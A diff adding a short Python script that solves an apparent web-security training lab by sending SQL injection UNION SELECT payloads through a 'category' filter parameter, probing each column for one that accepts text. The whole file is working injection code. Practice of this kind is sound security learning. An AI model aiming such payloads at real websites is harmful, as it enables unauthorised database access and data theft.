@@ -1,0 +1,30 @@
+import requests
+
+session = requests.Session()
+#i always trim the url until the /filter and no more after this and paste it as input
+filter_url = input("Enter/paste the Url here: ")
+
+valid_category = "Lifestyle" 
+
+num_columns = 3
+# this targe string can be different for any of you
+target_string = "i7STU1"
+
+print(f"[*] Starting type testing across {num_columns} columns...")
+for target_column in range(num_columns):
+
+    row_layout = ["NULL"] * num_columns
+    
+    row_layout[target_column] = f"'{target_string}'"
+    
+    payload = f"{valid_category}' UNION SELECT " + ",".join(row_layout) + "--"
+    params = {'category': payload}
+    
+    print(f"[*] Testing column index {target_column} with payload...")
+    response = session.get(filter_url, params=params)
+    
+    if "Congratulations, you solved the lab!" in response.text:
+        print(f"==> Success: Lab solved! Column {target_column + 1} accepts text data.")
+        break
+else:
+    print("==> Failed: Could not trigger solution. Double-check your column count or target string.")
